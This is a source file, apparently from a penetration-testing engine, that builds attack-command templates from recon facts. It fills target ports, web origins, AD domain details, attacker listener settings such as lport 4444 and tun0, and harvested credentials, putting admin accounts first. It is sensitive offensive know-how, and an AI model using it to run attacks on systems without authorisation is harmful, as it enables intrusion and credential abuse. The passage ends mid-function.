/*!
 * obol engine - command.js
 * Command templating: build the {{token}} context from proven facts + engagement params,
 * fill a command template, and render an action's command variants. Faithful JS port of the
 * relevant parts of  (command_context / fill_template / fill_command).
 *
 * Browser adaptation: there is no Workspace. Callers pass a FactSet (OBOL.facts.FactSet) and
 * an engagement `params` object (target/domain/username/password/lhost/…). Facts-derived
 * tokens fill from proven facts; `extra` pins specific values and wins over both.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  // These tokens deliberately contain authored shell syntax, rather than one argument.
  var EXPRESSION_TOKENS = { command: true, kerberos_command: true, sudo_command: true,
    abuse_groups_quoted: true, shares_readable_quoted: true, flag_inames_linux: true, flag_names_windows: true };
  var PATH_TOKENS = /(?:dir|file|path|list|script|binary|bin|archive|keyfile|export)$/i;
  var LIT_OPEN = '\x00OBOL_LBRACE\x00';
  var LIT_CLOSE = '\x00OBOL_RBRACE\x00';

  // POSIX shell single-quote quoting (equivalent of Python shlex.quote for our needs).
  function shellQuote(s) {
    s = String(s);
    if (s === '') return "''";
    if (/^[A-Za-z0-9_@%+=:,.\/-]+$/.test(s)) return s;
    return "'" + s.replace(/'/g, "'\\''") + "'";
  }

  function firstVal(facts, kind) {
    if (!facts) return null;
    if (typeof facts.values === 'function') {
      var v = facts.values(kind);
      return v && v.length ? v[0] : null;
    }
    var list = facts.facts || (Array.isArray(facts) ? facts : []);
    for (var i = 0; i < list.length; i++) {
      if (list[i] && (list[i].kind === kind || list[i].k === kind)) {
        return (list[i].value !== undefined) ? list[i].value : list[i].v;
      }
    }
    return null;
  }

  function isMultiOrKnownHost(list, targetScope) {
    if (!targetScope || !list || !list.length) return false;
    var hostScopes = {};
    var count = 0;
    for (var i = 0; i < list.length; i++) {
      var f = list[i];
      if (!f || !f.scope) continue;
      if (f.scope === targetScope) return true;
      if (f.scope.indexOf('host:') === 0 && f.scope !== 'host:target') {
        if (!hostScopes[f.scope]) {
          hostScopes[f.scope] = true;
          count++;
          if (count > 1) return true;
        }
      }
    }
    return false;
  }

  function scopedValues(facts, kind, targetIp) {
    if (!facts) return [];
    var list = (facts && facts.facts) || (Array.isArray(facts) ? facts : []);
    if (targetIp && list.length) {
      var targetScope = 'host:' + targetIp;
      var hostMatches = [];
      var genericMatches = [];
      for (var i = 0; i < list.length; i++) {
        var f = list[i];
        if (!f) continue;
        var k = f.kind || f.k || '';
        if (k !== kind) continue;
        if (f.state && OBOL.facts && f.state !== OBOL.facts.ProofState.SUPPORTED && f.state !== 'supported') continue;
        var val = f.value !== undefined ? f.value : f.v;
        if (f.scope === targetScope) {
          hostMatches.push(val);
        } else if (!f.scope || f.scope === 'global' || f.scope === 'host:target' || f.scope.indexOf('host:') !== 0) {
          genericMatches.push(val);
        }
      }
      if (hostMatches.length) return hostMatches;
      if (isMultiOrKnownHost(list, targetScope)) return genericMatches;
    }
    if (typeof facts.values === 'function') {
      return facts.values(kind);
    }
    var out = [];
    for (var j = 0; j < list.length; j++) {
      var fj = list[j];
      if (!fj) continue;
      var kj = fj.kind || fj.k || '';
      if (kj !== kind) continue;
      if (fj.state && OBOL.facts && fj.state !== OBOL.facts.ProofState.SUPPORTED && fj.state !== 'supported') continue;
      out.push(fj.value !== undefined ? fj.value : fj.v);
    }
    return out;
  }

  // Open ports as sorted numbers, from port:NNN facts (recon output).
  function openPorts(facts, targetIp) {
    var ports = [];
    if (!facts) return ports;
    var list = (facts && facts.facts) || (Array.isArray(facts) ? facts : []);
    var targetScope = targetIp ? ('host:' + targetIp) : '';
    var strictScope = isMultiOrKnownHost(list, targetScope);
    if (!strictScope && targetScope) {
      for (var s = 0; s < list.length; s++) {
        var fs = list[s];
        if (!fs) continue;
        var ks = fs.kind || fs.k || '';
        if (fs.scope === targetScope && ks.indexOf('port:') === 0) {
          strictScope = true;
          break;
        }
      }
    }
    for (var i = 0; i < list.length; i++) {
      var f = list[i];
      if (!f) continue;
      if (f.state && OBOL.facts && f.state !== OBOL.facts.ProofState.SUPPORTED && f.state !== 'supported') continue;
      if (strictScope && f.scope && f.scope.indexOf('host:') === 0 && f.scope !== 'host:target' && f.scope !== targetScope) continue;
      var k = f.kind || f.k || '';
      if (k.indexOf('port:') === 0) {
        var n = parseInt(k.split(':')[1], 10);
        if (!isNaN(n)) ports.push(n);
      }
    }
    // also honor a ports.open summary fact carrying a list
    var summaries = scopedValues(facts, 'ports.open', targetIp);
    var summary = summaries && summaries[0] ? summaries[0] : (strictScope ? null : firstVal(facts, 'ports.open'));
    if (summary && Array.isArray(summary.ports)) {
      summary.ports.forEach(function (p) { var n = parseInt(p, 10); if (!isNaN(n)) ports.push(n); });
    }
    var hasLoopbackFoothold = false;
    var hasPivot = false;
    for (var lfi = 0; lfi < list.length; lfi++) {
      var lff = list[lfi];
      if (!lff || (lff.state && OBOL.facts && lff.state !== OBOL.facts.ProofState.SUPPORTED && lff.state !== 'supported')) continue;
      if (strictScope && lff.scope && lff.scope.indexOf('host:') === 0 && lff.scope !== 'host:target' && lff.scope !== targetScope) continue;
      var lfk = lff.kind || lff.k || '';
      if (lfk === 'foothold.linux' || lfk === 'foothold.windows' || lfk === 'pivot.ports' || lfk === 'pivot.tunnel_active' || lfk === 'pivot.active') {
        hasLoopbackFoothold = true;
      }
      if (lfk === 'pivot.ports' || lfk === 'pivot.tunnel_active' || lfk === 'pivot.active') {
        hasPivot = true;
      }
    }
    if (hasLoopbackFoothold) {
      var PIVOT_LISTENER_PORTS = { 22: 1, 80: 1, 443: 1, 445: 1, 1433: 1, 1521: 1, 3306: 1, 3389: 1, 5432: 1, 5900: 1, 5985: 1, 5986: 1, 6379: 1, 8000: 1, 8080: 1, 8443: 1, 27017: 1 };
      function _allowLoopbackPort(n, kind) {
        if (!(n >= 1 && n <= 65535)) return false;
        if (kind === 'pivot.ports') return true;
        if (n === 3306 || n === 5432) return true;
        return !!(hasPivot && PIVOT_LISTENER_PORTS[n]);
      }
      for (var lpi = 0; lpi < list.length; lpi++) {
        var lpf = list[lpi];
        if (!lpf || (lpf.state && OBOL.facts && lpf.state !== OBOL.facts.ProofState.SUPPORTED && lpf.state !== 'supported')) continue;
        if (strictScope && lpf.scope && lpf.scope.indexOf('host:') === 0 && lpf.scope !== 'host:target' && lpf.scope !== targetScope) continue;
        var lpk = lpf.kind || lpf.k || '';
        if (lpk !== 'scan.local.listeners' && lpk !== 'pivot.ports') continue;
        var lpv = lpf.value || {};
        var lpArr = Array.isArray(lpv.ports) ? lpv.ports : [];
        for (var lpj = 0; lpj < lpArr.length; lpj++) {
          var lpn = parseInt(lpArr[lpj] && typeof lpArr[lpj] === 'object' ? lpArr[lpj].port : lpArr[lpj], 10);
          if (_allowLoopbackPort(lpn, lpk)) ports.push(lpn);
        }
        if (Array.isArray(lpv.forwards)) {
          for (var lpfw = 0; lpfw < lpv.forwards.length; lpfw++) {
            var fw = lpv.forwards[lpfw] || {};
            var fwp = parseInt(fw.rport || fw.remotePort || fw.port || fw.lport, 10);
            if (_allowLoopbackPort(fwp, lpk)) ports.push(fwp);
          }
        }
        var lps = parseInt(lpv.port, 10);
        if (_allowLoopbackPort(lps, lpk)) ports.push(lps);
      }
    }
    ports = ports.filter(function (v, i, a) { return a.indexOf(v) === i; });
    ports.sort(function (a, b) { return a - b; });
    return ports;
  }

  // Map obol engagement params to the base token context (ws.inputs analog).
  function paramsToInputs(params) {
    params = params || {};
    var ctx = {};
    Object.keys(params).forEach(function (k) {
      var v = params[k];
      if (v === null || v === undefined || v === '') return;
      ctx[k] = v;
    });
    // common aliases obol uses
    if (params.username && !ctx.user) ctx.user = params.username;
    if (params.target && !ctx.target) ctx.target = params.target;
    if (params.rhost && !ctx.target) ctx.target = params.rhost;
    return ctx;
  }

  var WEB_PORT_PRIORITY = [80, 443, 81, 8000, 8080, 8443, 8083, 8888, 3000, 5000, 8008, 8081, 8082, 8880, 9000, 9090, 10000];
  var NON_WEB_HTTP_PORTS = { 5985: 1, 5986: 1, 47001: 1 };

  function _normalizeOrigin(scheme, host, port) {
    var sc = String(scheme || '').toLowerCase().replace(/:\/\/$/, '');
    var p = parseInt(port, 10);
    if (!sc) sc = (p === 443 || p === 8443) ? 'https' : 'http';
    if (!p || isNaN(p)) p = (sc === 'https') ? 443 : 80;
    var h = String(host || '').trim().replace(/^\[|\]$/g, '');
    if (!h) return '';
    var stdPort = (sc === 'http' && p === 80) || (sc === 'https' && p === 443);
    var hostOut = (h.indexOf(':') >= 0 && h.indexOf('.') < 0) ? ('[' + h + ']') : h;
    return sc + '://' + hostOut + (stdPort ? '' : (':' + p));
  }

  function _parseUrlOrigin(u, fallbackHost) {
    var m = String(u || '').trim().match(/^(https?):\/\/([^\/:\s'"]+)(?::(\d+))?/i);
    if (!m) return null;
    var sc = m[1].toLowerCase();
    var h = m[2] || fallbackHost || '';
    var p = m[3] ? parseInt(m[3], 10) : (sc === 'https' ? 443 : 80);
    if (NON_WEB_HTTP_PORTS[p]) return null;
    return { scheme: sc, host: h, port: p, origin: _normalizeOrigin(sc, h, p) };
  }

  function webOrigins(facts, opts) {
    opts = opts || {};
    var factArr = [];
    if (facts && facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts)) {
      factArr = facts._resolvedContext.allScopedFacts;
    } else if (facts && Array.isArray(facts.facts)) {
      factArr = facts.facts;
    } else if (Array.isArray(facts)) {
      factArr = facts;
    }
    var tgtIp = String(opts.target || (opts.params && opts.params.target) || (facts && facts.context && facts.context.target) || '').trim();
    if (!tgtIp) {
      for (var fi = 0; fi < factArr.length; fi++) {
        var fsc = factArr[fi] && factArr[fi].scope;
        if (fsc && fsc.indexOf('host:') === 0) { tgtIp = fsc.slice(5); break; }
      }
    }
    var hostAddr = tgtIp || String(opts.defaultHost || '127.0.0.1').trim() || '127.0.0.1';
    function vals(kind) {
      if (facts && typeof facts.values === 'function') return facts.values(kind) || [];
      return scopedValues(facts, kind, tgtIp);
    }
    var tlsPorts = { 443: true, 8443: true };
    var discoveredPorts = {};
    vals('tls.info').concat(vals('ssl.cert')).forEach(function (v) {
      if (v && v.port) tlsPorts[parseInt(v.port, 10)] = true;
    });
    vals('ports.open').forEach(function (v) {
      if (!v) return;
      var entries = Array.isArray(v.ports) ? v.ports : (Array.isArray(v.entries) ? v.entries : [v]);
      entries.forEach(function (e) {
        if (!e || typeof e !== 'object') return;
        var ep = parseInt(e.port, 10);
        if (!ep || isNaN(ep) || NON_WEB_HTTP_PORTS[ep] || (e.proto && String(e.proto).toLowerCase() === 'udp')) return;
        var svc = String(e.service || e.name || e.product || '').toLowerCase();
        if (/ssl|https|tls/.test(svc) || e.tls || e.ssl) tlsPorts[ep] = true;
        if ((WEB_PORT_PRIORITY.indexOf(ep) >= 0 || /https?|http-alt|http-proxy|werkzeug|gunicorn|uvicorn|jetty|tomcat|nginx|apache|iis|lighttpd|caddy/.test(svc))
          && !/wsman|winrm|upnp|ssdp|msrpc/.test(svc)) {
          discoveredPorts[ep] = true;
        }
      });
    });
    var openP = openPorts(facts, tgtIp);
    for (var opi = 0; opi < openP.length; opi++) {
      var opNum = parseInt(openP[opi], 10);
      if (opNum && !NON_WEB_HTTP_PORTS[opNum] && WEB_PORT_PRIORITY.indexOf(opNum) >= 0) {
        discoveredPorts[opNum] = true;
      }
    }
    for (var wpi = 0; wpi < WEB_PORT_PRIORITY.length; wpi++) {
      var candP = WEB_PORT_PRIORITY[wpi];
      if (facts && typeof facts.has === 'function' && facts.has('port:' + candP)) {
        discoveredPorts[candP] = true;
      }
    }
    var webEvidence = vals('http.reachable').concat(vals('web.server')).concat(vals('http.response'))
      .concat(vals('http.headers')).concat(vals('http.redirect')).concat(vals('web.login_form')).concat(vals('web.tech')).concat(vals('web.parameterized'));
    var extraOrigins = [];
    webEvidence.forEach(function (v) {
      if (!v || typeof v !== 'object') return;
      if (v.scheme && String(v.scheme).toLowerCase() === 'https' && v.port) tlsPorts[parseInt(v.port, 10)] = true;
      if (v.port) {
        var vp = parseInt(v.port, 10);
        if (vp && !NON_WEB_HTTP_PORTS[vp]) discoveredPorts[vp] = true;
      }
      var uStr = v.origin || v.base_url || v.url || v.location || v.target || v.to || '';
      if (uStr) {
        var parsed = _parseUrlOrigin(uStr, hostAddr);
        if (parsed) {
          if (parsed.scheme === 'https') tlsPorts[parsed.port] = true;
          discoveredPorts[parsed.port] = true;
          if (parsed.host && parsed.host.toLowerCase() !== hostAddr.toLowerCase() && parsed.host.indexOf('.') > 0) {
            extraOrigins.push(parsed);
          }
        }
      }
    });
    if (!Object.keys(discoveredPorts).length && ((facts && typeof facts.has === 'function' && facts.has('http.reachable')) || webEvidence.length > 0)) {
      discoveredPorts[80] = true;
    }
    var portNums = Object.keys(discoveredPorts).map(function (k) { return parseInt(k, 10); }).filter(function (n) { return n > 0; });
    portNums.sort(function (a, b) {
      var ia = WEB_PORT_PRIORITY.indexOf(a), ib = WEB_PORT_PRIORITY.indexOf(b);
      if (ia >= 0 && ib >= 0) return ia - ib;
      if (ia >= 0) return -1;
      if (ib >= 0) return 1;
      return a - b;
    });
    var all = [], seenOrigin = {};
    function pushOrigin(sc, h, p) {
      var orig = _normalizeOrigin(sc, h, p);
      if (!orig) return;
      var key = orig.toLowerCase();
      if (seenOrigin[key]) return;
      seenOrigin[key] = true;
      all.push({ origin: orig, scheme: sc, host: h, port: p, mapped: false });
    }
    portNums.forEach(function (p) {
      var sc = tlsPorts[p] ? 'https' : 'http';
      pushOrigin(sc, hostAddr, p);
    });
    extraOrigins.forEach(function (eo) {
      pushOrigin(eo.scheme, eo.host, eo.port);
    });
    var baseVhostDom = '';
    var adDoms = vals('ad.domain_known');
    for (var adi = 0; adi < adDoms.length; adi++) {
      var adDomName = adDoms[adi] && (adDoms[adi].name || adDoms[adi].domain);
      if (adDomName) { baseVhostDom = String(adDomName).trim(); break; }
    }
    if (!baseVhostDom) {
      var hDomVals = vals('host.domain').concat(vals('dns.zone'));
      for (var hdv = 0; hdv < hDomVals.length; hdv++) {
        var hdStr = hDomVals[hdv] && (hDomVals[hdv].domain || hDomVals[hdv].name || hDomVals[hdv].zone);
        if (hdStr) { baseVhostDom = String(hdStr).trim().replace(/\.+$/, ''); break; }
      }
    }
    if (!baseVhostDom) {
      var fqVals0 = vals('host.fqdn');
      for (var fqi = 0; fqi < fqVals0.length; fqi++) {
        var fqs0 = String((fqVals0[fqi] && (fqVals0[fqi].fqdn || fqVals0[fqi].name)) || '').trim();
        var fqp0 = fqs0.split('.');
        if (fqp0.length >= 3) { baseVhostDom = fqp0.slice(1).join('.'); break; }
        if (fqp0.length === 2 && !/^\d+$/.test(fqp0[0]) && /^[a-z]{2,}$/i.test(fqp0[1])) { baseVhostDom = fqs0; break; }
      }
    }
    if (!baseVhostDom) {
      for (var eoi = 0; eoi < extraOrigins.length; eoi++) {
        var eoh = String((extraOrigins[eoi] && extraOrigins[eoi].host) || '').trim();
        if (!eoh || /^(?:\d{1,3}\.){3}\d{1,3}$/.test(eoh) || eoh.indexOf(':') >= 0) continue;
        var eop = eoh.split('.');
        if (eop.length >= 3) { baseVhostDom = eop.slice(1).join('.'); break; }
        if (eop.length === 2 && !/^\d+$/.test(eop[0]) && /^[a-z]{2,}$/i.test(eop[1])) { baseVhostDom = eoh; break; }
      }
    }
    if (!baseVhostDom && opts.params && opts.params.domain) baseVhostDom = String(opts.params.domain).trim();
    factArr.forEach(function (f) {
      if (!f || f.state === 'refuted' || f.kind !== 'web.vhost') return;
      if (tgtIp && f.scope && f.scope.indexOf('host:') === 0 && f.scope.slice(5) !== tgtIp) return;
      var v = f.value;
      if (!v || typeof v !== 'object') return;
      var srcM = /Host\s*:\s*['"]?FUZZ\.([A-Za-z0-9.-]+)/i.exec(String(f.source || ''));
      var qualDom = (srcM && srcM[1] ? srcM[1].replace(/\.+$/, '') : '') || baseVhostDom;
      var rawList = [];
      if (Array.isArray(v.vhosts)) {
        for (var vi = 0; vi < v.vhosts.length; vi++) {
          var el = v.vhosts[vi];
          rawList.push(el && typeof el === 'object' ? (el.vhost || el.hostname || el.domain || el.name || '') : el);
        }
      }
      var sing = v.vhost || v.hostname || v.domain || v.name || '';
      if (sing) rawList.push(sing);
      var vp = parseInt(v.port, 10) || (portNums[0] || 80);
      if (NON_WEB_HTTP_PORTS[vp]) return;
      var vsc = v.scheme ? String(v.scheme).toLowerCase() : (tlsPorts[vp] ? 'https' : 'http');
      for (var rli = 0; rli < rawList.length; rli++) {
        var vh = String(rawList[rli] || '').trim().replace(/^['"]+|['"]+$/g, '');
        if (!vh) continue;
        var vhp = _parseUrlOrigin(vh, hostAddr);
        if (vhp && vhp.host && vhp.host.indexOf('.') > 0) {
          pushOrigin(vhp.scheme, vhp.host, vhp.port);
          continue;
        }
        vh = vh.replace(/:\d+$/, '');
        if (vh.indexOf('.') < 0 && qualDom) {
          vh = vh + '.' + qualDom.replace(/^\.+|\.+$/g, '');
        }
        if (vh.indexOf('.') < 0) continue;
        pushOrigin(vsc, vh, vp);
      }
    });
    function markByParsed(parsed) {
      if (!parsed) return false;
      var hit = false;
      var normLow = parsed.origin.toLowerCase();
      all.forEach(function (item) {
        if (item.origin.toLowerCase() === normLow) { item.mapped = true; hit = true; }
        else if (item.port === parsed.port && (!parsed.host || parsed.host.toLowerCase() === hostAddr.toLowerCase()) && item.host.toLowerCase() === hostAddr.toLowerCase()) {
          item.mapped = true; hit = true;
        }
      });
      return hit;
    }
    function markByPort(portNum) {
      var p = parseInt(portNum, 10);
      if (!p || isNaN(p)) return false;
      var hit = false;
      all.forEach(function (item) {
        if (item.port === p && item.host.toLowerCase() === hostAddr.toLowerCase()) {
          item.mapped = true; hit = true;
        }
      });
      return hit;
    }
    factArr.forEach(function (f) {
      if (!f || f.state === 'refuted' || f.kind !== 'web.content_map') return;
      if (tgtIp && f.scope && f.scope.indexOf('host:') === 0 && f.scope.slice(5) !== tgtIp) return;
      var v = f.value || {};
      var matched = false;
      if (v.origin || v.url || v.base_url) {
        if (markByParsed(_parseUrlOrigin(v.origin || v.url || v.base_url, hostAddr))) matched = true;
      }
      if (v.port && markByPort(v.port)) matched = true;
      if (!matched && f.source) {
        var sm = String(f.source).match(/https?:\/\/[^\s/'"]+/i);
        if (sm && markByParsed(_parseUrlOrigin(sm[0], hostAddr))) matched = true;
      }
      if (!matched && Array.isArray(v.paths)) {
        for (var pi = 0; pi < v.paths.length; pi++) {
          var pm = String(v.paths[pi] || '').match(/^(https?:\/\/[^\s/'"]+)/i);
          if (pm && markByParsed(_parseUrlOrigin(pm[1], hostAddr))) { matched = true; break; }
        }
      }
      if (!matched && all.length > 0) {
        all[0].mapped = true;
      }
    });
    var eng = opts.engagement
      || (facts && facts._resolvedContext && facts._resolvedContext.engagement)
      || (root.OBOL && root.OBOL.store && typeof root.OBOL.store.active === 'function' ? root.OBOL.store.active() : null);
    var acts = Array.isArray(opts.activities) ? opts.activities : ((eng && Array.isArray(eng.activities)) ? eng.activities : []);
    acts.forEach(function (act) {
      if (!act || !act.outcome || !act.outcome.conclusive || !act.outcome.retireCommand) return;
      var actTgt = act.target || (/^host:/.test(act.scope || '') ? act.scope.slice(5) : '');
      if (tgtIp && actTgt && actTgt !== tgtIp) return;
      var aid = act.action_id || act.actionId || '';
      var cmdText = String(act.command || act.dispatch || '');
      if (aid === 'vhost-discovery' || aid === 'param-discovery') return;
      if (/-H\s*['"]?Host:[^'"]*FUZZ\b|\b(?:gobuster|feroxbuster)\s+(?:vhost|dns)\b|[?&][^=\s]+=FUZZ\b|(?:^|\s)(?:-d|--data(?:-(?:raw|binary|ascii|urlencode))?)\s+['"]?[^\r\n'"]*FUZZ\b/i.test(cmdText)) return;
      if (aid !== 'content-discovery' && !/\b(?:ffuf|gobuster|feroxbuster|dirsearch)\b/i.test(cmdText)) return;
      var um = cmdText.match(/https?:\/\/[^\s/'"]+/i) || String(act.stdout || '').slice(0, 600).match(/https?:\/\/[^\s/'"]+/i);
      if (um) markByParsed(_parseUrlOrigin(um[0], hostAddr));
    });
    var unmapped = all.filter(function (item) { return !item.mapped; });
    var fallbackPort = portNums[0] || 80;
    var fallbackScheme = tlsPorts[fallbackPort] ? 'https' : 'http';
    var primary = unmapped[0] || all[0] || {
      origin: _normalizeOrigin(fallbackScheme, hostAddr, fallbackPort),
      scheme: fallbackScheme,
      host: hostAddr,
      port: fallbackPort,
      mapped: false
    };
    return { all: all, unmapped: unmapped, primary: primary };
  }

  var _baseCtxCache = typeof WeakMap !== 'undefined' ? new WeakMap() : null;

  // Build the {{token}} context from facts + params (+ extra which wins).
  function buildContext(facts, opts) {
    opts = opts || {};
    var resolved = opts.context && opts.context.params ? opts.context : null;
    if (!resolved && facts && typeof facts.forAction === 'function' && opts.action && !opts.service && !opts.locus
        && (!opts.target || (facts._resolvedContext && opts.target === facts._resolvedContext.target))) {
      var af = facts.forAction(opts.action, { run: opts.command || '' });
      if (af && af._resolvedContext) resolved = af._resolvedContext;
    }
    if (!resolved && OBOL.context) {
      var activeEng = opts.engagement || (OBOL.store && OBOL.store.active && OBOL.store.active()) || null;
      resolved = OBOL.context.resolve({ engagement: activeEng, facts: facts, params: opts.params || (activeEng && activeEng.params) || {},
        target: opts.target, command: opts.command || '', service: opts.service, locus: opts.locus, actionId: opts.action && opts.action.id });
    }
    if (resolved) { facts = resolved.facts; opts = Object.assign({}, opts, { params: resolved.params, target: resolved.target }); }
    if (Array.isArray(facts) && OBOL.facts && OBOL.facts.FactSet) {
      facts = new OBOL.facts.FactSet(facts.map(function (x) {
        return (OBOL.facts && OBOL.facts.factFromJson) ? OBOL.facts.factFromJson(x) : x;
      }));
    }
    function fvals(kind) {
      if (!facts) return [];
      if (typeof facts.values === 'function') return facts.values(kind);
      return scopedValues(facts, kind, '');
    }
    var params = opts.params || {};
    var extra = opts.extra || {};
    var tgt = opts.target || params.target || params.rhost || '';
    var wsd = opts.workspace || { root: '.', scandir: 'scans', lootdir: 'loot', exploitdir: 'exploit', wwwdir: 'www', proofdir: 'proof' };
    var arProf = _arsenalProfile();

    var projObj = (_baseCtxCache && resolved && facts && !(opts.action && (opts.action.id === 'asrep-roast' || opts.action.id === 'kerberoast' || opts.action.id === 'ssh-key-login')))
      ? Object.getPrototypeOf(facts) : null;
    if (projObj === Object.prototype) projObj = null;
    var projMap = projObj ? _baseCtxCache.get(projObj) : null;
    var cacheEng = (resolved && resolved.engagement) || opts.engagement || (root.OBOL && root.OBOL.store && typeof root.OBOL.store.active === 'function' ? root.OBOL.store.active() : null);
    var actLen = Array.isArray(opts.activities) ? opts.activities.length : ((cacheEng && Array.isArray(cacheEng.activities)) ? cacheEng.activities.length : 0);
    var baseKey = projObj
      ? [tgt, resolved.credentialId || '', resolved.selectionSource || '', (facts.facts && facts.facts.length) || 0, actLen, JSON.stringify(params), JSON.stringify(opts.profile || null), JSON.stringify(wsd), _arsenalRaw || ''].join('\x01')
      : '';
    var ctx;
    if (projMap && projMap[baseKey]) {
      ctx = Object.assign({}, projMap[baseKey]);
    } else {
    ctx = Object.assign({ target: tgt || '<target>' }, paramsToInputs(params));
    if (tgt) ctx.target = tgt;

    var ports = openPorts(facts, tgt);
    if (ports.length) {
      var lowPorts = ports.filter(function (p) { return p < 49152; });
      var highEphemeralCount = ports.length - lowPorts.length;
      ctx.nmap_ports = (lowPorts.length > 0 && highEphemeralCount >= 3 ? lowPorts : ports).join(',');
    }

    var dom = firstVal(facts, 'ad.domain_known');
    var domStr = dom && String(dom.name || dom.domain || '').trim();
    if (!ctx.domain && domStr) {
      ctx.domain = domStr;
      ctx.basedn = domStr.split('.').map(function (p) { return 'DC=' + p; }).join(',');
      ctx.dc = domStr;
    }
    if (!ctx.domain) {
      var hdoms = fvals('host.domain').concat(fvals('dns.zone'));
      for (var hd = 0; hd < hdoms.length; hd++) {
        var dname = String((hdoms[hd] && (hdoms[hd].domain || hdoms[hd].name || hdoms[hd].zone)) || '').trim().replace(/\.+$/, '');
        if (dname) { ctx.domain = dname; break; }
      }
    }
    if (!ctx.domain) {
      var fqdns = fvals('host.fqdn');
      for (var fq = 0; fq < fqdns.length; fq++) {
        var fqStr = String(fqdns[fq].fqdn || fqdns[fq].name || '').trim().replace(/\.+$/, '');
        var fqParts = fqStr.split('.');
        if (fqParts.length >= 3) {
          ctx.domain = fqParts.slice(1).join('.');
          break;
        } else if (fqParts.length === 2 && !/^\d+$/.test(fqParts[0]) && /^[a-z]{2,}$/i.test(fqParts[1])) {
          ctx.domain = fqStr;
          break;
        }
      }
    }
    if (!ctx.domain) {
      var vhosts = fvals('web.vhost').concat(fvals('ssl.cert'));
      for (var vhi = 0; vhi < vhosts.length; vhi++) {
        var vhv = vhosts[vhi] || {};
        var vhStr = String(vhv.domain || vhv.vhost || vhv.host || vhv.cn || '').trim().replace(/^\*\./, '').replace(/\.+$/, '');
        if (!vhStr || /^(?:\d{1,3}\.){3}\d{1,3}$/.test(vhStr) || vhStr.indexOf('.') < 0) continue;
        var vhParts = vhStr.split('.');
        if (vhParts.length >= 3) { ctx.domain = vhParts.slice(1).join('.'); break; }
        if (vhParts.length === 2 && !/^\d+$/.test(vhParts[0]) && /^[a-z]{2,}$/i.test(vhParts[1])) { ctx.domain = vhStr; break; }
      }
    }
    if (!ctx.domain) {
      var woFallback = webOrigins(facts, { target: tgt, params: params, engagement: cacheEng, activities: opts.activities }).all || [];
      for (var woi = 0; woi < woFallback.length; woi++) {
        var woh = String((woFallback[woi] && woFallback[woi].host) || '').trim().replace(/\.+$/, '');
        if (!woh || /^(?:\d{1,3}\.){3}\d{1,3}$/.test(woh) || woh.indexOf(':') >= 0) continue;
        var woParts = woh.split('.');
        if (woParts.length >= 3) {
          ctx.domain = woParts.slice(1).join('.');
          break;
        } else if (woParts.length === 2 && !/^\d+$/.test(woParts[0]) && /^[a-z]{2,}$/i.test(woParts[1])) {
          ctx.domain = woh;
          break;
        }
      }
    }
    if (ctx.domain && !ctx.dc) ctx.dc = ctx.domain;
    if (!ctx.basedn) {
      var bases = fvals('ad.base_dn');
      for (var i = 0; i < bases.length; i++) {
        var bd = bases[i].base_dn || bases[i].basedn || '';
        if (bd) { ctx.basedn = bd; break; }
      }
    }
    // domain from params if facts didn't provide it, derive basedn
    if (!ctx.domain && params.domain) ctx.domain = params.domain;
    if (ctx.domain && !ctx.basedn) {
      ctx.basedn = ctx.domain.split('.').map(function (p) { return 'DC=' + p; }).join(',');
    }
    if (!ctx.domain && params.authRealm) ctx.domain = params.authRealm;

    // lhost: params-pinned, else a listener fact, else synced Loadout VPN IP, else leave for operator
    if (!ctx.lhost) {
      var lo = firstVal(facts, 'listener.open');
      if (lo && lo.lhost) ctx.lhost = lo.lhost;
      else if (arProf && arProf.lhost) ctx.lhost = arProf.lhost;
    }
    // lport: params-pinned (set in the sidebar), else a listener fact, else the 4444 convention so a
    // reverse-shell / listener command is complete out of the box. The operator can change it anywhere.
    if (!ctx.lport) {
      var lop = firstVal(facts, 'listener.open');
      ctx.lport = (lop && lop.lport) || params.lport || '4444';
    }
    // iface: the operator's attacker interface (responder -I, mitm6 -i, ...). Pinned from the engagement's
    // configured VM interface or synced Loadout VPN interface, defaulting to tun0.
    if (!ctx.iface) ctx.iface = params.lhost_iface || (arProf && arProf.lhost_iface) || 'tun0';
    if (!ctx.arsenal_www) ctx.arsenal_www = (arProf && arProf.wwwdir) || '~/.obol/arsenal/www';
    if (!ctx.tooldir) ctx.tooldir = params.toolsDir || (arProf && arProf.tooldir) || '~/tools';

    // credentials: prefer credential.available then credential.plaintext. IDENTITY-COHERENT fill - never
    // pair one credential's username with another's secret. `-u svc-alfresco -H <administrator-hash>` just
    // fails auth; the user and the secret must come from the SAME credential. When params already pin a
    // user, fill that same user's secret; otherwise adopt the first credential wholesale.
    var isExplicitAnon = !(opts.action && opts.action.id === 'ssh-key-login') && !!(resolved && (
      (resolved.selectionSource === 'explicit' && !resolved.credentialId)
      || (resolved.engagement && resolved.engagement.context && resolved.engagement.context.anonymousByTarget && tgt && resolved.engagement.context.anonymousByTarget[tgt])
    ));
    if (!resolved || (!isExplicitAnon && !ctx.user && !ctx.password && !ctx.nthash && opts.action && opts.action.id === 'validate-credential')) {
    var creds = fvals('credential.available');
    if (!creds.length) creds = fvals('credential.plaintext');
    if (!creds.length && resolved && Array.isArray(resolved.allScopedFacts)) {
      creds = resolved.allScopedFacts.filter(function (sf) {
        return sf && sf.state === 'supported' && (sf.kind === 'credential.available' || sf.kind === 'credential.plaintext') && sf.value;
      }).map(function (sf) { return sf.value; });
    }
    if (!creds.length && resolved && resolved.engagement && Array.isArray(resolved.engagement.facts)) {
      creds = resolved.engagement.facts.filter(function (ef) {
        return ef && (!ef.state || ef.state === 'supported') && (ef.kind === 'credential.available' || ef.kind === 'credential.plaintext') && ef.value;
      }).map(function (ef) { return ef.value; });
    }
    function _lc(x) { return String(x == null ? '' : x).toLowerCase(); }
    function _credRank(c) {
      if (!c) return -1;
      var s = 0;
      if (c.admin) s += 4;
      if (/^administrator$/i.test(c.user || '')) s += 2;
      if (c.validated) s += 2;
      if (c.password || c.secret || c.nthash || c.hash) s += 1;
      return s;
    }
    var rankedCreds = creds.map(function (c, i) { return { c: c, i: i, r: _credRank(c) }; })
      .sort(function (a, b) { return (b.r - a.r) || (b.i - a.i); })
      .map(function (x) { return x.c; });
    if (ctx.user) {
      for (var c = 0; c < rankedCreds.length; c++) {
        if (_lc(rankedCreds[c].user) !== _lc(ctx.user)) continue;
        if (!ctx.password && !ctx.nthash) {
          if (rankedCreds[c].password || rankedCreds[c].secret) ctx.password = rankedCreds[c].password || rankedCreds[c].secret;
          var nhm = rankedCreds[c].nthash || rankedCreds[c].hash;
          if (nhm) ctx.nthash = nhm;
        }
